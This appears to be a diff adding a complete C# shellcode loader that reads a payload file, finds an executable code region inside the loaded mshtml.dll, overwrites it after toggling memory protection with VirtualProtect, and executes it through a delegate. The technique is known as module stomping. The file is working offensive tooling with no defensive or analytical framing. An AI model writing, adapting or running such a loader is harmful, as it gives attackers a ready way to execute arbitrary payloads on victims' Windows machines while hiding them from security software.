@@ -1,0 +1,191 @@
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+public class Program
+{
+    // DllImports for Windows API functions
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr LoadLibrary(string lpFileName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool FreeLibrary(IntPtr hModule);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern int VirtualQuery(IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    // Memory protection constants
+    const uint PAGE_READWRITE = 0x04;
+    const uint PAGE_EXECUTE_READ = 0x20;
+    const uint PAGE_EXECUTE_READWRITE = 0x40; // Defined for completeness, but originalProtect might be PAGE_EXECUTE_READ
+
+    // MEMORY_BASIC_INFORMATION structure for VirtualQuery
+    [StructLayout(LayoutKind.Sequential)]
+    public struct MEMORY_BASIC_INFORMATION
+    {
+        public IntPtr BaseAddress;
+        public IntPtr AllocationBase;
+        public uint AllocationProtect;
+        public UIntPtr RegionSize;
+        public uint State; // MEM_COMMIT, MEM_FREE, MEM_RESERVE
+        public uint Protect; // PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, etc.
+        public uint Type; // MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE
+    }
+
+    // Constants for MEMORY_BASIC_INFORMATION.State and .Type
+    const uint MEM_IMAGE = 0x1000000;
+    const uint MEM_COMMIT = 0x1000;
+
+    // Delegate definition for shellcode execution
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate void RunShellcode();
+
+    public static void Main(string[] args)
+    {
+        // 1. Validate command-line arguments
+        if (args.Length < 1)
+        {
+            Console.WriteLine("Usage: ShellcodeLoader.exe <path_to_shellcode.bin>");
+            return;
+        }
+
+        byte[] payload;
+        string shellcodePath = args[0];
+
+        try
+        {
+            // 2. Read shellcode from the specified file path
+            payload = File.ReadAllBytes(shellcodePath);
+            Console.WriteLine(string.Format("Successfully read {0} bytes from {1}", payload.Length, shellcodePath));
+        }
+        catch (FileNotFoundException)
+        {
+            Console.WriteLine(string.Format("Error: Shellcode file not found at {0}", shellcodePath));
+            return;
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(string.Format("Error reading shellcode file: {0}", ex.Message));
+            return;
+        }
+
+        IntPtr hModule = IntPtr.Zero;
+        IntPtr stompedAddress = IntPtr.Zero;
+        uint originalProtect = 0;
+
+        try
+        {
+            // 3. Load a legitimate DLL (mshtml.dll)
+            // This DLL is often large and present on Windows systems, providing ample space.
+            hModule = LoadLibrary("mshtml.dll");
+            if (hModule == IntPtr.Zero)
+            {
+                Console.WriteLine(string.Format("Error: LoadLibrary failed for mshtml.dll. Last Win32 Error: {0}", Marshal.GetLastWin32Error()));
+                return;
+            }
+            Console.WriteLine(string.Format("Loaded mshtml.dll at 0x{0:X}", hModule.ToInt64()));
+
+            // 4. Search for a suitable executable memory region within the loaded DLL
+            // We iterate through memory regions within the DLL's address space using VirtualQuery.
+            // A heuristic max scan range is used to prevent scanning excessively, assuming mshtml.dll is not extremely large.
+            IntPtr currentAddress = hModule;
+            MEMORY_BASIC_INFORMATION mbi;
+            bool foundRegion = false;
+            long maxScanRange = 10 * 1024 * 1024; // Scan up to 10 MB from the module base
+            long scannedBytes = 0;
+
+            while (scannedBytes < maxScanRange && VirtualQuery(currentAddress, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
+            {
+                // Check if the region is committed, part of an image, and has executable permissions
+                if (mbi.State == MEM_COMMIT && mbi.Type == MEM_IMAGE &&
+                    ((mbi.Protect & PAGE_EXECUTE_READ) == PAGE_EXECUTE_READ || (mbi.Protect & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE))
+                {
+                    // Ensure the region is large enough for the shellcode payload
+                    if ((ulong)mbi.RegionSize.ToUInt64() >= (ulong)payload.Length)
+                    {
+                        stompedAddress = mbi.BaseAddress;
+                        originalProtect = mbi.Protect;
+                        foundRegion = true;
+                        Console.WriteLine(string.Format("Found suitable executable region at 0x{0:X} with size 0x{1:X} and protection 0x{2:X}",
+                                                        stompedAddress.ToInt64(), mbi.RegionSize.ToUInt64(), originalProtect));
+                        break; // Found a suitable region, exit loop
+                    }
+                }
+                
+                // Move to the next memory region to continue the search
+                long nextAddressLong = (long)mbi.BaseAddress + (long)mbi.RegionSize;
+                // Safety check to prevent infinite loops if VirtualQuery doesn't advance the address
+                if (nextAddressLong <= (long)currentAddress) 
+                {
+                    nextAddressLong = (long)currentAddress + 0x1000; // Advance by at least one page
+                }
+                currentAddress = (IntPtr)nextAddressLong;
+                scannedBytes = (long)currentAddress - (long)hModule; // Update scanned bytes count
+            }
+
+            if (!foundRegion)
+            {
+                Console.WriteLine("Error: Could not find a suitable executable memory region in mshtml.dll to stomp.");
+                return;
+            }
+
+            // 5. Temporarily change memory protection to PAGE_READWRITE to allow writing
+            // This is a (R)X -> RW transition on existing image memory.
+            uint oldProtectBeforeWrite;
+            if (!VirtualProtect(stompedAddress, (UIntPtr)payload.Length, PAGE_READWRITE, out oldProtectBeforeWrite))
+            {
+                Console.WriteLine(string.Format("Error: VirtualProtect failed to change to PAGE_READWRITE. Last Win32 Error: {0}", Marshal.GetLastWin32Error()));
+                return;
+            }
+            Console.WriteLine(string.Format("Memory protection at 0x{0:X} changed from 0x{1:X} to 0x{2:X} (PAGE_READWRITE)",
+                                            stompedAddress.ToInt64(), oldProtectBeforeWrite, PAGE_READWRITE));
+
+            // 6. Copy the shellcode into the stomped memory region
+            Marshal.Copy(payload, 0, stompedAddress, payload.Length);
+            Console.WriteLine("Shellcode copied to stomped memory region.");
+
+            // 7. Restore the original memory protection (PAGE_EXECUTE_READ or PAGE_EXECUTE_READWRITE)
+            // This is an RW -> (R)X transition, restoring the original executable state.
+            uint oldProtectAfterWrite;
+            if (!VirtualProtect(stompedAddress, (UIntPtr)payload.Length, originalProtect, out oldProtectAfterWrite))
+            {
+                Console.WriteLine(string.Format("Error: VirtualProtect failed to restore original protection. Last Win32 Error: {0}", Marshal.GetLastWin32Error()));
+                return;
+            }
+            Console.WriteLine(string.Format("Memory protection at 0x{0:X} restored from 0x{1:X} to 0x{2:X}",
+                                            stompedAddress.ToInt64(), oldProtectAfterWrite, originalProtect));
+
+            // 8. Execute the shellcode by creating and invoking a delegate
+            RunShellcode func = (RunShellcode)Marshal.GetDelegateForFunctionPointer(stompedAddress, typeof(RunShellcode));
+            Console.WriteLine("Executing shellcode...");
+            
+            try
+            {
+                func(); // This call will transfer execution to the shellcode
+                Console.WriteLine("Shellcode execution finished (or process terminated).");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(string.Format("Error during shellcode execution: {0}", ex.Message));
+            }
+        }
+        finally
+        {
+            // 9. Free the loaded library (if not already freed by shellcode exiting the process)
+            if (hModule != IntPtr.Zero)
+            {
+                if (FreeLibrary(hModule))
+                {
+                    Console.WriteLine("mshtml.dll freed successfully.");
+                }
+                else
+                {
+                    Console.WriteLine(string.Format("Warning: Failed to free mshtml.dll. Last Win32 Error: {0}", Marshal.GetLastWin32Error()));
+                }
+            }
+        }
+    }
+}
